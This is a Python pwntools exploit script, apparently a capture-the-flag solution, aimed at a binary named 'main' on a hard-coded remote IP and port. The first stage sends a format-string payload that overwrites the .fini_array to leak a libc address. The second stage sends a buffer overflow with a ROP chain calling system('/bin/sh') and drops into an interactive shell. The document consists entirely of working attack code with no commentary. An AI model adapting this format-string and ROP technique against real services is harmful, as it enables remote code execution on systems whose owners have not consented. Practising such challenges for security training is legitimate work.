#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('main')
libc = ELF('libc-2.19.so')
#libc = ELF('/lib64/libc.so.6')

host = args.HOST or '139.59.30.165'
port = int(args.PORT or 9200)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()

buff_len = 0x40
libc_offset = 0x21f45

# stage 1
main = 0x400637
fini_array = 0x6008C8
arg_off = 11

payload = "%17${}p%{}$n".format(main, arg_off) + "\x00" * 7 + p64(fini_array)
io.sendlineafter("inputz:", payload)
io.recvline()
addr = int(io.recvline()[15:], 16) - libc_offset
log.success("LIBC: " + hex(addr))

# stage 2
libc.address = addr
rop = ROP(libc)
rop.system(next(libc.search('/bin/sh\x00')))
print (rop.dump())
payload = buff_len * "A" + "junkjunk" + rop.chain()
io.sendlineafter("inputz:", payload)

io.interactive()

